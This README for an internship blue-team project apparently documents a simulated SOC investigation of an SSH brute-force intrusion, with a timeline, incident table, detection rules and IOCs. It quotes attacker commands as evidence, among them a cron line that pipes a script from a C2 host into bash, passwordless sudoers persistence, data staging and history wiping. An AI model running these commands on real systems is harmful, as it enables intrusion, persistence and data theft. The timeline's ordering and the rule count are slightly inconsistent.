# 🔵 Security Monitoring & Incident Response
### Project 04 — Blue Team | Cryptonic Area Cybersecurity Internship

<p align="center">
  <img src="https://img.shields.io/badge/Project-Security%20Monitoring%20%26%20Incident%20Response-blue?style=for-the-badge&logo=shield&logoColor=white"/>
  <img src="https://img.shields.io/badge/Status-Completed-green?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Intern-Harmain%20Shah-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/ID-CA0200-red?style=for-the-badge"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Log%20Sources-2-informational?style=flat-square"/>
  <img src="https://img.shields.io/badge/Incidents%20Identified-9-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/Critical-4-critical?style=flat-square"/>
  <img src="https://img.shields.io/badge/High-3-orange?style=flat-square"/>
  <img src="https://img.shields.io/badge/Attack%20Duration-35%20min-yellow?style=flat-square"/>
  <img src="https://img.shields.io/badge/Framework-NIST%20SP%20800--61-blue?style=flat-square"/>
</p>

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Scenario & Context](#-scenario--context)
- [Log Sources Analysed](#-log-sources-analysed)
- [Attack Timeline](#-attack-timeline)
- [Incident Classification](#-incident-classification)
- [Detection Rules](#-detection-rules)
- [Indicators of Compromise](#-indicators-of-compromise-iocs)
- [Incident Response Workflow](#-incident-response-workflow)
- [Repository Structure](#-repository-structure)
- [Report](#-report)
- [Skills Demonstrated](#-skills-demonstrated)
- [Disclaimer](#-disclaimer)

---

## 🔍 Project Overview

This project is part of the **Cryptonic Area Cyber Security & Ethical Hacking Internship Program — Project 04 (Blue Team)**. It simulates a real-world Security Operations Center (SOC) investigation where an analyst detects, analyses, and responds to a multi-stage intrusion on a production Linux web server.

> *"Somewhere in the noise, an attacker left a trace. Find it."*

Two raw server log files — `auth.log` and `syslog.log` — were provided containing a mix of normal baseline activity and a live intrusion. The goal was to identify every malicious event, reconstruct the full attack chain, classify each incident by severity, create detection rules, and produce a professional Incident Response Report.

---

## 🏢 Scenario & Context

| Field | Details |
|---|---|
| **Project** | 04 — Blue Team: Security Monitoring & Incident Response |
| **Host** | webserver01 |
| **Log Period** | 09 March – 10 March 2024 |
| **Incident Window** | 10 March 2024, 03:14 AM – 06:33 AM |
| **Log Sources** | auth.log + syslog.log |
| **Analyst Role** | SOC Analyst / Incident Responder |
| **Framework Applied** | NIST SP 800-61 Incident Response Lifecycle |

---

## 📂 Log Sources Analysed

### auth.log
Records all authentication events on the Linux system:
- SSH login attempts (successful and failed)
- sudo command executions
- User account creation and modification
- Session open/close events
- PAM authentication logs

### syslog.log
Records system-level events:
- Cron job executions
- Kernel messages (IPTABLES firewall logs)
- systemd service events
- DHCP lease renewals
- Process audit events (EXECVE)

---

## ⏱️ Attack Timeline

The attacker launched a coordinated multi-stage attack beginning at **03:14 AM** on 10 March 2024. The full compromise was achieved in under **35 minutes**.

```
03:14:02  ──► SSH Brute-Force begins from 198.51.100.23
              (40+ attempts against database, postgres, pi, admin, support, backup...)

03:20:04  ──► Malicious cron job already executing in syslog
              (curl -s http://192.0.2.99/update.sh | bash — every 10 min)

03:32:29  ──► MaxAuthTries hit — "Too many authentication failures"

03:38:21  ──► Targeted attack on real account "backup" (8 rapid attempts)
              ↓
03:45:16  ──► ✅ SUCCESS — Accepted password for "backup" from 198.51.100.23
              ↓
03:45:36  ──► sudo /usr/bin/id          ← privilege recon
03:45:41  ──► sudo /usr/bin/cat /etc/sudoers ← sudoers inspection
03:46:21  ──► sudo /bin/bash            ← FULL ROOT SHELL OBTAINED
              ↓
03:47:11  ──► useradd sysupdate         ← backdoor account created (UID=1002)
03:47:19  ──► passwd sysupdate          ← password set
03:47:31  ──► usermod -aG sudo sysupdate ← sudo privileges granted
03:47:46  ──► NOPASSWD added to /etc/sudoers ← permanent root persistence
              ↓
03:48:26  ──► crontab: */10 * * * * curl -s http://192.0.2.99/update.sh | bash
              (C2 beacon installed in root crontab)
              ↓
03:23:10  ──► tar czf /tmp/.cache_bkp.tar.gz /var/www/html /etc/nginx
              (web root + nginx config archived — DATA STAGING)
03:23:55  ──► IPTABLES-OUT: Large packets to 192.0.2.99:443 PSH+ACK
03:24:00  ──► IPTABLES-OUT: FIN packet to 192.0.2.99:443
              (DATA EXFILTRATION CONFIRMED)
              ↓
03:48:51  ──► echo > /home/backup/.bash_history ← evidence wiped
03:48:59  ──► history -c                         ← history cleared
03:49:19  ──► Session closed — attacker disconnects

06:03:19  ──► Attacker returns via backdoor: Accepted password for "sysupdate"
06:33:19  ──► Session closed (30-min second session)
```

---

## 📊 Incident Classification

| ID | Incident | Severity | Time | Priority |
|---|---|---|---|---|
| INC-001 | SSH Brute-Force Campaign (40+ attempts) | 🟠 HIGH | 03:14–03:38 | P2 |
| INC-002 | Successful SSH Intrusion via "backup" account | 🔴 CRITICAL | 03:45:16 | P1 |
| INC-003 | Privilege Escalation to Root via sudo | 🔴 CRITICAL | 03:45:36–03:46:21 | P1 |
| INC-004 | Backdoor Account "sysupdate" Created | 🔴 CRITICAL | 03:47:11 | P1 |
| INC-005 | Malicious Cron Job / C2 Beacon Installed | 🔴 CRITICAL | 03:48:26 | P1 |
| INC-006 | Data Staging & Exfiltration to C2 | 🟠 HIGH | 03:23:10–03:24:00 | P1 |
| INC-007 | Evidence Tampering (bash history wiped) | 🟡 MEDIUM | 03:48:51–03:48:59 | P2 |
| INC-008 | Backdoor Re-Entry via "sysupdate" | 🟠 HIGH | 06:03–06:33 | P1 |
| INC-009 | Post-Compromise Probes (root/admin) | 🟢 LOW | 12:10, 12:40 | P3 |

---

## 🔍 Detection Rules

Ten SIEM detection rules were created based on observed attack patterns. Full logic is documented in [`Detection-Rules.md`](./Detection-Rules.md).

| Rule | Trigger | Severity |
|---|---|---|
| RULE-01 | ≥10 failed SSH logins from one IP within 5 min | HIGH |
| RULE-02 | ≥5 "Invalid user" attempts from one IP within 3 min | MEDIUM |
| RULE-03 | Successful login after ≥5 prior failures from same IP | CRITICAL |
| RULE-04 | SSH password auth from non-approved IP | HIGH |
| RULE-05 | sudo events between 22:00–06:00 from non-scheduled accounts | HIGH |
| RULE-06 | useradd / adduser outside change-management window | HIGH |
| RULE-07 | NOPASSWD or ALL=(ALL) written to /etc/sudoers | CRITICAL |
| RULE-08 | crontab write containing curl\|bash or external IP | CRITICAL |
| RULE-09 | Outbound connection to non-approved external IP | HIGH |
| RULE-10 | tar/zip creation in /tmp targeting /var/www or /etc | MEDIUM |
| RULE-11 | bash_history cleared (echo > .bash_history or history -c) | HIGH |
| RULE-12 | Same curl\|bash cron firing every ≤10 min | CRITICAL |

---

## 🚨 Indicators of Compromise (IOCs)

Full IOC list with sources is in [`IOCs.md`](./IOCs.md).

### Attacker Infrastructure
```
198.51.100.23      — Attacker source IP (SSH brute-force + intrusion)
192.0.2.99         — C2 / exfiltration server
http://192.0.2.99/update.sh — Malicious script (C2 beacon payload)
```

### Persistence Mechanisms
```
Username:   sysupdate (UID=1002, GID=1002)
Sudo rule:  sysupdate ALL=(ALL) NOPASSWD:ALL
Cron entry: */10 * * * * curl -s http://192.0.2.99/update.sh | bash
```

### Exfiltrated Data
```
/tmp/.cache_bkp.tar.gz  — Staged archive (web root + nginx config)
/var/www/html           — Web application source code
/etc/nginx              — nginx server configuration
Destination:            192.0.2.99:443 (confirmed by IPTABLES-OUT logs)
```

### Compromised Accounts
```
backup    — Entry point (brute-forced, had sudo privileges)
sysupdate — Backdoor account (created by attacker, passwordless root)
```

---

## 🔄 Incident Response Workflow

The **NIST SP 800-61** lifecycle was applied to this investigation:

```
┌─────────────────────────────────────────────────────────────┐
│  1. DETECTION     → SSH brute-force triggers at 03:14       │
│                     C2 beacon in syslog at 03:20            │
├─────────────────────────────────────────────────────────────┤
│  2. TRIAGE        → Classified CRITICAL — active intrusion  │
│                     Notify Tier 2 SOC + Security Manager    │
├─────────────────────────────────────────────────────────────┤
│  3. INVESTIGATION → Correlate auth.log + syslog             │
│                     Identify IPs, accounts, persistence     │
├─────────────────────────────────────────────────────────────┤
│  4. CONTAINMENT   → Block 198.51.100.23 + 192.0.2.99       │
│                     Terminate active sessions               │
├─────────────────────────────────────────────────────────────┤
│  5. ERADICATION   → Delete sysupdate account               │
│                     Remove malicious cron entry             │
│                     Revert /etc/sudoers                     │
├─────────────────────────────────────────────────────────────┤
│  6. RECOVERY      → Rotate secrets, restore from backup     │
│                     Harden SSH — disable password auth      │
├─────────────────────────────────────────────────────────────┤
│  7. POST-INCIDENT → Document lessons learned                │
│                     Update detection rules                  │
└─────────────────────────────────────────────────────────────┘
```

Full workflow with specific commands and actions is in [`Incident-Response-Workflow.md`](./Incident-Response-Workflow.md).

---

## 📁 Repository Structure

```
soc-monitoring-incident-response/
│
├── README.md                          ← You are here
├── IR_Report_Harmain_Shah_CA0200.pdf  ← Full professional investigation report
│
├── logs/
│   ├── auth.log                       ← SSH + authentication events log
│   └── syslog.log                     ← System events + firewall + cron log
│
├── Attack-Timeline.md                 ← Minute-by-minute attack reconstruction
├── Incident-Classification.md        ← All 9 incidents with severity and impact
├── Detection-Rules.md                 ← 12 SIEM detection rules with logic
├── IOCs.md                            ← All indicators of compromise
├── Incident-Response-Workflow.md      ← NIST SP 800-61 lifecycle applied
├── Security-Recommendations.md        ← 10 hardening recommendations
└── .gitignore
```

---

## 📄 Report

The full professional Incident Response Report is available in this repository:

📎 **[`IR_Report_Harmain_Shah_CA0200.pdf`](./IR_Report_Harmain_Shah_CA0200.pdf)**

### Report Sections:
| Section | Content |
|---|---|
| Executive Summary | Full attack chain overview with finding table |
| Detailed Log Analysis | Normal baseline + complete attack timeline |
| Detection Logic | 12 SIEM rules with conditions and actions |
| Incident Classification | All 9 incidents with severity, impact, and response |
| Incident Handling Workflow | NIST SP 800-61 lifecycle applied to this case |
| Security Recommendations | 10 specific hardening measures with root cause mapping |
| IOC Summary | All attacker infrastructure and persistence artefacts |

---

## 💡 Skills Demonstrated

```
✔  Log Analysis               — auth.log and syslog.log correlation
✔  Attack Reconstruction      — Building a timeline from raw log data
✔  Intrusion Detection        — Identifying brute-force, escalation, persistence
✔  SIEM Rule Creation         — Writing detection logic from observed patterns
✔  Incident Classification    — CRITICAL / HIGH / MEDIUM / LOW severity assignment
✔  Threat Intelligence        — C2 IP identification, IOC documentation
✔  NIST SP 800-61             — Applying the incident response lifecycle
✔  Evidence Preservation      — Identifying anti-forensics and mitigating impact
✔  Hardening Recommendations  — Mapping remediation to root causes
✔  Technical Report Writing   — Professional incident response documentation
```

---

## ⚠️ Disclaimer

This project was completed as part of a **controlled internship training exercise** provided by Cryptonic Area. The log files (`auth.log` and `syslog.log`) are simulated samples created for educational purposes. All IP addresses and account names are fictitious.

No real systems were accessed or compromised during this investigation. The attacker IPs and C2 domains documented in this repository are for **threat intelligence and educational reference only**.

---

<p align="center">
  <b>Harmain Shah</b> | Intern ID: CA0200<br>
  Cryptonic Area Cyber Security & Ethical Hacking Internship Program<br>
  <i>Project 04 — Blue Team: Security Monitoring & Incident Response</i>
</p>
